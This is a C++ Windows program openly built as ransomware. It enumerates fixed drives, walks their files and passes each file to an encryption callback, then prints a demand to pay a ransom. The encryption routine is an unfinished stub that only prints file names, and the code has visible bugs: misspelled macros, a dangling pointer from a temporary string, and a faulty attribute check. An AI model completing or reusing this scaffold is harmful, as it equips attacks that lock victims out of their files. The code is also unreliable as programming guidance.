#include <windows.h>
#include <fileapi.h>
#include <string>
#include <vector>
#include <iostream>

// include openssl

#define DEBUG
#define MULTI_THREADING 0
#define RECURSIVE false

#if MULTI_THREADNG == 1
#include <thread>
#endif

using namespace std;

class Helpers
{
public:
    static string formatPath(char x, string rootPath)
    {
        return rootPath.substr(0, rootPath.find_last_of("\\") + 1) + x;
    }
    static char fileAttrFilter(DWORD attr, WIN32_FIND_DATAA fData)
    {
        if (strcmp(fData.cFileName, ".") == 0 || strcmp(fData.cFileName, "..") == 0)
            return 'N';

        if ((FILE_ATTRIBUTE_DIRECTORY & attr) != 0x0)
        {
            // directory
            if (
                (attr & FILE_ATTRIBUTE_HIDDEN) == 0x0 &&
                (attr & FILE_ATTRIBUTE_DEVICE) == 0x0 &&
                (attr & FILE_ATTRIBUTE_SYSTEM) == 0x0)
                return 'D';
        }
        else
        {
            // file
            if (
                (attr & FILE_ATTRIBUTE_NORMAL) != 0x0 &&
                (attr & FILE_ATTRIBUTE_READONLY) == 0x0 &&
                (attr & FILE_ATTRIBUTE_HIDDEN == 0x0))
                return 'F';
        };
        return 'N';
    };
};
class Process
{
private:
public:
    Process() {};
};

class Crypto
{
protected:
    static void encrypt(string file)
    {
#ifdef DEBUG
        cout << "Encrypting " << file << endl;
#endif
    }

    static void decrypt(string file)
    {
    }
};

class Scanners
{
public:
    static vector<string>
    scanDisks(UINT typeFilter = DRIVE_FIXED)
    {
        // scan for non removable disks and add to disks
        char *buff = new char[1025];
        DWORD total = GetLogicalDriveStringsA(1024, buff) + 1;
        vector<string> disks;
        string curr = "";
        DWORD index = 0;
        while (index < total)
        {
            char s = buff[index];
            if (s == '\0')
            {
                UINT type = GetDriveTypeA(curr.c_str());
                if (type == typeFilter)
                    disks.push_back(curr);
                curr = "";
                index++;
                continue;
            }
            curr.push_back(s);
            index++;
        }

        return disks;
    }
    static void scanDisksRecursive(const std::vector<string> &roots, void (*callback)(string))
    {
        size_t len = roots.size();
        for (size_t i = 0; i < len; i++)
// for each disk scann threadt
#if MULTI_THREADING == 1
            thread(Scanners::scanRootRecursive, roots.at(i), callback).detach();
#else
        {
            cout << "Scanning disk: " << roots.at(i) << endl;
            Scanners::scanRootRecursive(roots.at(i), callback);
        }
#endif
    }

    static void scanRootRecursive(string root, void (*callback)(string))
    {

        WIN32_FIND_DATAA fData = {0};
        const char *formated = Helpers::formatPath('*', root).c_str();

        cout << "formated path: " << formated << endl;
        HANDLE searchHandle = FindFirstFileA(formated, &fData);
#ifdef DEBUG
        if (searchHandle == INVALID_HANDLE_VALUE)
        {
            cout << "FAILED TO OPEN FILE hex code:" << hex << GetLastError() << endl;
            exit(1);
        }
#endif
        do
        {
#if RECURSIVE
            if (Helpers::fileAttrFilter(fData.dwFileAttributes, fData) == 'D')
            {
                string sub_root = root.substr(0, root.find_last_of("\\") + 1) + fData.cFileName + "\\";
#ifdef DEBUG
                cout << "Found out Directory: " << sub_root << endl;
#endif
#if MULTI_THREADNIG == 1
                thread(Scanners::scanRootRecursive, sub_root, callback).detach();
#else
                Scanners::scanRootRecursive(sub_root, callback);
#endif
            }

#else
            if (Helpers::fileAttrFilter(fData.dwFileAttributes, fData) == 'F')
            {
                string file = root.substr(0, root.find_last_of("\\") + 1) + fData.cFileName;
#ifdef DEBUG
                cout << "executing callback() on " << file << endl;
#endif
                callback(file);
            }
#endif

        } while (FindNextFileA(searchHandle, &fData));
        FindClose(searchHandle);
    }

    static vector<Process> scanProcesses()
    {
        std::vector<Process> procs;
        return procs;
    }
};

class Ransom : private Crypto
{
private:
    vector<string> scopes;
    string scope = "";
    bool status = false;

public:
    int activate(string root = "")
    {
        if (status)
        {
            cout << "Already Activated!" << endl;
            return -1;
        }
        this->status = true;
        if (root == "")
        {
            this->scopes = Scanners::scanDisks(DRIVE_FIXED);
#ifdef DEBUG
            for (auto disk : this->scopes)
                cout << "DISK : " << disk << endl;
#endif
            Scanners::scanDisksRecursive(this->scopes, Crypto::encrypt);
        }
        else
        {
            this->scope = root + "\\";
            Scanners::scanRootRecursive(this->scope, Crypto::encrypt);
        }
        return 0;
    }
    void deactivate()
    {
    }
};

int main(int argc, char **argv)
{
    cout << "running!" << endl;
    cout << "Arg: " << argv[1] << endl;
    Ransom r = Ransom();
    r.activate(string(argv[1]));
    cout << "EVERYTHING HAS BEEN ENCRYPTED! PAY RANSOM TO DECRYPT!(or press enter)" << endl;
    int x = 0;
    cin >> x;
    r.deactivate();

    return 0;
}